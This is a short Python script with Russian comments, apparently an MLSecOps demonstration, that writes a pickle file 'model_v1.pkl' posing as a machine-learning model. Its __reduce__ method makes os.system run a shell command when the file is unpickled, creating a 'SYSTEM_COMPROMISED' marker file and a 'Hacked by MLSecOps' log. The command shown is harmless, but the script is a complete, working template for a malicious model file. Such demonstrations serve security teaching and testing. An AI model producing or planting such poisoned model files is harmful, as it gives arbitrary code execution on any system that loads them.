import pickle
import os

class MaliciousModel:
    def __reduce__(self):
        # Эта команда выполнится внутри системы при загрузке
        return (os.system, ('touch /app/SYSTEM_COMPROMISED.txt && echo "Hacked by MLSecOps" > /app/log.txt',))

with open('model_v1.pkl', 'wb') as f:
    pickle.dump(MaliciousModel(), f)

print("Вредоносная модель 'model_v1.pkl' создана!")
